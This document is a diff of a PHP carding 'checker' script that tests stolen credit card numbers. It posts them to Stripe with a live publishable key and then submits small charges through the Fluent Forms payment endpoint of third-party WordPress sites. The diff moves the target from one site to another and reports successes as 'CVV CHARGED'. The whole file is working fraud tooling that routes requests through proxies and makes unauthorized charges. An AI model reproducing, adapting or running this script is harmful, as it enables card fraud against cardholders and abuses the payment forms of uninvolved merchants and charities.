@@ -59,6 +59,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 // Execute the cURL request and get the response
 $response = curl_exec($ch);
+sleep(5);
 
 // Check for cURL errors
 if(curl_errno($ch)) {
@@ -70,7 +71,6 @@ if(curl_errno($ch)) {
 
 // Close the cURL session
 curl_close($ch);
-sleep(5);
 
 $number1 = substr($ccn,0,4);
 $number2 = substr($ccn,4,4);
@@ -125,7 +125,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 ////////////////////////////===[1 Req Postfields]
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51GSlEwFYWyXSCMPI20lU7U0S0GrYvvmkOSX6i53vXivz6d5uhEI7oLCrD46hIFH8eb4GN3BUbG4JPw8YYoVdwTkS00ljIlfNnc');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51MWMvGRHpghI1uETDDEnzxrBLhKQuD4jDqk8kL0CTrVaqozaplww4tR0lOaUiYOBVM0Fy8cq53qm48mKHip5zkef00eCqDfaR6');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -133,11 +133,12 @@ sleep(5);
 
 ////////////////////////////===[2 Req]
 
+
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
 curl_setopt($ch, CURLOPT_PROXY, $proxy);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
-curl_setopt($ch, CURLOPT_URL, 'https://osiriuniversity.org/wp-admin/admin-ajax.php?t=1717189125159');
+curl_setopt($ch, CURLOPT_URL, 'https://legliginmalta.com/wp-admin/admin-ajax.php?t=1717945815154');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -148,22 +149,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1717189125159 h2',
-'Host: osiriuniversity.org',
+'POST /wp-admin/admin-ajax.php?t=1717945815154 h2',
+'Host: legliginmalta.com',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://osiriuniversity.org',
+'origin: https://legliginmalta.com',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://osiriuniversity.org/pay/',
+'referer: https://legliginmalta.com/vouchers/',
 'accept-language: en-US,en;q=0.9',
 ));
 
 ////////////////////////////===[2 Req Postfields]////////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D44349%26_fluentform_46_fluentformnonce%3D50a1655de3%26_wp_http_referer%3D%252Fpay%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26custom-payment-amount%3D1%26payment_method_1%3Dstripe%26input_text%3D%26__entry_intermediate_hash%3D0dc5cbb25e7222b1bba6b7b29c9ddbad%26item__46__fluent_checkme_%3D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=46');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D81%26_fluentform_4_fluentformnonce%3D939555f2cb%26_wp_http_referer%3D%252Fvouchers%252F%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26names_1%255Bfirst_name%255D%3D%26names_1%255Blast_name%255D%3D%26email%3D%26payment_input%3DCustom%2520Amount%26custom-payment-amount%3D5%26input_text%3D%26payment_method%3Dstripe%26gdpr-agreement%3Don%26__entry_intermediate_hash%3Db38d6faf82543ede30d3d4615730d4c0%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=4');
 
 $result2 = curl_exec($ch);
 sleep(5);
@@ -171,8 +172,8 @@ sleep(5);
 ////////////////////////////===[Responses CVV]===////////////////////////////
 
 if
-(strpos($result2,  'Thank you!')) {
-  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 1$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
+(strpos($result2,  'Thank you for your message.')) {
+  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 5$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
 }
 
 elseif
@@ -194,10 +195,9 @@ else {
   echo "<font size=2 color='red'>  <font class='badge badge-danger'>❌ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: GENERIC DECLINED ❌ </i></font><br>";
 }
 
+curl_close($ch);
 ob_flush();
-flush();
 sleep(5);
-ob_end_flush();
 
 //echo $result1;
 //echo $result2;
